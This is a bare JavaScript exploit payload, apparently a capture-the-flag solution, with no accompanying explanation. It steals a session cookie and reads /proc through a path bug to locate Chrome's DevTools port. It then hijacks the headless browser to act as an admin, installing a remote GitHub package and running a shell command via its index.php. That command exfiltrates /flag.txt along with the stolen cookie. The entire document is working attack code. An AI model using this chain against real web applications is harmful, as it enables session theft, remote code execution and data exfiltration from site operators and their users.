(async()=>{
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return await r.text();
 }catch(e){return ''}
};
const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
const stage=`(async()=>{
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const api=async(p,d)=>{
 let f=new FormData();
 f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
 f.append('__json__',JSON.stringify(d));
 let r=await fetch(p,{method:'POST',body:f});
 let t=await r.text().catch(()=>'');
 return p+' '+r.status+' '+t.slice(0,80);
};
await sleep(1500);
if(!document.querySelector('meta[name=csrf]'))return 'csrf none '+location.href;
let a=await api('/_api/package-manager/add-repository',{platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'}).catch(e=>'add err '+e.name+' '+e.message);
let b=await api('/_api/package-manager/install',{package:'2ash1/static'}).catch(e=>'install err '+e.name+' '+e.message);
await sleep(2000);
let ck=decodeURIComponent(location.hash.slice(1));
let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
return a+' | '+b;
})()`;

const findWs=async()=>{
 for(let pid=1;pid<5000;pid++){
  let c=await read('/proc/'+pid+'/cmdline');
  if(!/chrome|chromium/i.test(c)||c.includes('--type=zygote')||c.includes('--type=gpu')||c.includes('--type=utility'))continue;
  let m=c.match(/--user-data-dir=(\/tmp\/\.[A-Za-z0-9._-]*scoped_dir\.[A-Za-z0-9]+)/)||c.match(/--user-data-dir=(.*?)(?:\.--[A-Za-z0-9-]+=|\.--[A-Za-z0-9-]+\.|$)/);
  if(!m)continue;
  let dir=m[1].replace(/\.+$/,'');
  post('udir '+dir.slice(0,80));
  let d=await read(dir+'/DevToolsActivePort');
  post('dtap '+d.length+' '+d.slice(0,80));
  let q=d.match(/(\d+).*?(\/?devtools\/browser\/[A-Za-z0-9.-]+)/);
  if(q)return 'ws://localhost:'+q[1]+(q[2][0]=='/'?q[2]:'/'+q[2]);
 }
 return '';
};

const run=wsurl=>{
 post('cdp dyn '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
 let ws=new WebSocket(wsurl),id=0,wait={};
 const send=(method,params={},sid='')=>new Promise((res,rej)=>{
  let n=++id;
  wait[n]=res;
  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
  setTimeout(()=>rej(new Error('timeout '+method)),8000);
 });
 ws.onerror=()=>post('ws error');
 ws.onmessage=e=>{
  let m=JSON.parse(e.data);
  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
 };
 ws.onopen=async()=>{
  try{
   post('ws open');
   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
   post('target attach');
   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
   post('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
  }catch(e){post('err '+e.name+' '+e.message)}
 };
};

post('cdp dyn 0615t');
let wsurl=await findWs();
if(!wsurl){post('ws none');return}
run(wsurl);
})();
